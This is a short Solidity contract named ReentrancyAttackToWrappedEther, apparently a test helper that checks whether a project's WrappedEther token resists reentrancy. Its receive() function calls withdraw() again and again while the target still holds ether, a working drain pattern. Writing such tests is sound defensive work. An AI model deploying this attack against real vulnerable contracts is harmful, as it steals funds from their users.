// SPDX-License-Identifier: GPL-3.0-or-later WITH Classpath-exception-2.0
pragma solidity ^0.8.37;

import {WrappedEther} from "src/erc20/WrappedEther.sol";

contract ReentrancyAttackToWrappedEther {
    WrappedEther public wrappedEther;
    uint256 public value;

    constructor(WrappedEther _wrappedEther) payable {
        wrappedEther = _wrappedEther;
        value = msg.value;
    }

    function deposit() public {
        // forge-lint: disable-next-item(arbitrary-send-eth)
        wrappedEther.deposit{value: value}();
    }

    function withdraw() public {
        wrappedEther.withdraw(value);
    }

    receive() external payable {
        if (address(wrappedEther).balance > 0) {
            withdraw();
        }
    }
}
